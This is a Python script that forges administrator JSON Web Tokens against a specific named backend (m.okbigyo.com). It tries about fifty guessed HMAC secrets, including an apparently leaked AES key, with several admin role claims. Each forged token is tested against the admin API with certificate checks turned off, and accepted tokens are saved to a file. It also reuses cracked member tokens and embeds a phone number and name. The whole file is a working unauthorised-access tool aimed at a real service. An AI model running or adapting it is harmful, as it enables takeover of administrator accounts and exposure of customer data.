#!/usr/bin/env python3
"""Forge admin-role JWTs against the okbigyo backend.

Observed member token: HS256, claims {role:"MEMBER", session:<opaque>,
iss:"okbigyo", mobile, name, exp}. If the HMAC secret is weak/reused
(the app's AES key is known: okbigyo1okbigyo2okbigyo3okbigyo4), we can mint
any role. Test battery:

  secrets  ~45 candidates (known AES key, brand strings, classics)
  claims   role variants: MEMBER-as-is control, ADMIN_MASTER, ADMIN_NORMAL,
           ADMIN, SUPER_ADMIN, ROLE_ADMIN, + adminId/adminSeq injected
  oracle   GET /admin-api/admins?page=1&pageSize=5 with the forged token:
           200 + JSON data => FORGED ACCEPTED -> save admin_token.json

Stdlib only (hmac/hashlib/base64). Budget ~200 requests, 0.35s pace.
"""
import base64
import hashlib
import hmac
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
TEST_URL = "https://m.okbigyo.com:9443/bigyo/admin-api/admins?page=1&pageSize=5"
CTL_URL = "https://m.okbigyo.com:9443/bigyo/api/common/time"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
PACE = 0.35
BUDGET = [220]
LOGF = os.path.join(HERE, "jwtforge_log.jsonl")

SECRETS = [
    "okbigyo1okbigyo2okbigyo3okbigyo4",   # the AES key — prime suspect
    "okbigyo", "okbigyo1234", "okbigyo!", "okbigyo!1234", "okbigyo2024",
    "okbigyo2025", "okbigyo2026", "bigyo", "bigyo1234", "okbank", "okbank1234",
    "coocon", "coocon1234", "ok", "ok!",
    "secret", "secret1234", "jwt-secret", "jwtsecret", "jwt_secret",
    "okbigyo-secret", "okbigyo_secret", "okbigyo.jwt.secret",
    "okbigyoJwtSecret", "okbigyo-jwt-key", "okbigyoJwtKey", "okbigyo_key",
    "1234567890", "12345678", "123456789", "abcdefgh", "password",
    "admin1234", "admin", "test", "test1234", "spring", "springboot",
    "okbigyo123456789", "Okbigyo!1234", "okbigyo!@#", "okbigyo2024!",
    "okbigyo2025!", "okbigyo2026!", "ok_bigyo_secret", "okbigyo.key",
    "hwahae-okbigyo", "ok-financial", "okfinancial", "okcapital",
]

ROLE_VARIANTS = [
    {"role": "ADMIN_MASTER"},
    {"role": "ADMIN_NORMAL"},
    {"role": "ADMIN"},
    {"role": "SUPER_ADMIN"},
    {"role": "ROLE_ADMIN"},
    {"role": "MASTER"},
    {"role": "MEMBER", "adminId": "dongmin", "adminSeq": 1},
    {"role": "ADMIN_MASTER", "adminId": "dongmin", "adminSeq": 1},
]


def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def sign(secret, header, claims):
    h = b64(json.dumps(header, separators=(",", ":")).encode())
    c = b64(json.dumps(claims, separators=(",", ":"), ensure_ascii=False).encode())
    sig = hmac.new(secret.encode(), f"{h}.{c}".encode(), hashlib.sha256).digest()
    return f"{h}.{c}.{b64(sig)}"


def get(url, token=None):
    hdrs = {"User-Agent": UA}
    if token:
        hdrs["Authorization"] = "Bearer " + token
    rq = urllib.request.Request(url, headers=hdrs)
    try:
        with urllib.request.urlopen(rq, timeout=12, context=CTX) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, repr(e)[:150]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def journal(entry):
    with open(LOGF, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def main():
    log("JWTFORGE START")
    ct, cb = get(CTL_URL)
    log(f"control common/time -> http={ct} {cb[:80]}")
    bt, bb = get(TEST_URL)
    log(f"baseline /admins anon -> http={bt} {bb[:160]}")
    baseline_sig = (bt, bb[:120])

    tf = os.path.join(HERE, "cracked_tokens.json")
    sample_claims = None
    if os.path.exists(tf):
        try:
            raw = json.load(open(tf))
            if isinstance(raw, dict):
                first = next(iter(raw.values()))
                tok = ((first.get("resp") or {}).get("data") or {}).get("token")
            elif isinstance(raw, list) and raw:
                tok = raw[0].get("token")
            else:
                tok = None
            if tok:
                seg = tok.split(".")[1]
                seg += "=" * (-len(seg) % 4)
                sample_claims = json.loads(base64.urlsafe_b64decode(seg))
                log(f"sample claims: {json.dumps(sample_claims, ensure_ascii=False)[:200]}")
        except Exception as e:
            log(f"claim parse: {e}")

    base_claims = dict(sample_claims) if sample_claims else {
        "session": "forged-session-0001", "iss": "okbigyo",
        "mobile": "01040039341", "name": "여동수",
    }
    base_claims.pop("exp", None)

    header = {"typ": "JWT", "alg": "HS256"}
    hits = 0
    for secret in SECRETS:
        if BUDGET[0] <= 0:
            break
        for vi, rv in enumerate(ROLE_VARIANTS):
            if BUDGET[0] <= 0:
                break
            BUDGET[0] -= 1
            claims = dict(base_claims)
            claims.update(rv)
            claims["exp"] = int(time.time()) + 3600
            tok = sign(secret, header, claims)
            st, body = get(TEST_URL, tok)
            journal({"secret": secret, "variant": vi, "http": st, "body": body[:400]})
            accepted = st == 200 and body[:120] != baseline_sig[1]
            if accepted:
                hits += 1
                log(f"★★★ FORGED ACCEPTED: secret='{secret}' variant={vi} -> {body[:200]}")
                cred = {"adminId": "forged-" + secret[:12], "secret": secret,
                        "variant": rv, "token": tok, "raw": body[:2000], "ts": int(time.time()),
                        "via": "jwtforge"}
                tok_fp = os.path.join(HERE, "admin_token.json")
                arr = []
                if os.path.exists(tok_fp):
                    try:
                        prev = json.load(open(tok_fp))
                        arr = prev if isinstance(prev, list) else [prev]
                    except Exception:
                        arr = []
                arr.append(cred)
                json.dump(arr, open(tok_fp, "w"), ensure_ascii=False, indent=1)
                log("*** admin_token.json WRITTEN (jwtforge)")
                time.sleep(PACE)
                continue
            time.sleep(PACE)
    log(f"JWTFORGE DONE hits={hits} budget_left={BUDGET[0]}")


if __name__ == "__main__":
    main()
